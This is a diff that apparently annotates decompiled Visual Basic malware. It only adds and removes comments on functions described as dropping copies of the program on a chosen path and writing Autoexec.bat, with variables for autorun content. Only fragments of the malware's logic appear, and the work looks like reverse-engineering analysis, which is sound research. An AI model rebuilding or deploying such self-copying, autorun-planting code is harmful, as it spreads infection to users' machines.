@@ -377,13 +377,10 @@ Public Function funct7(a) '403EC8
   loc_403EC0: funct7 = "scripting.filesystemobject"
 End Function
 
+' Drop copies on specified path
 Public Function funct8(a) '4054C0
   'Data Table: 401838
-  ' This function will deploy the files in the selected path
-
   ' Note: <> means a logical NOT operator
-
-  ' Define vars
   Dim sus_data As String
   Dim exe_path2 As String
   Dim autorun_content As Variant
@@ -429,7 +426,8 @@ Public Function funct8(a) '4054C0
   loc_4054B8: funct8 = CStr(exe_path) ' Return CStr(exe_path)
 End Function
 
-Public Function funct9() '404A00 ' Drop Autoexec.bat
+' Drop Autoexec.bat in current path
+Public Function funct9() '404A00
   'Data Table: 401838
   Dim var_B4 As Variant
   Dim var_108 As String
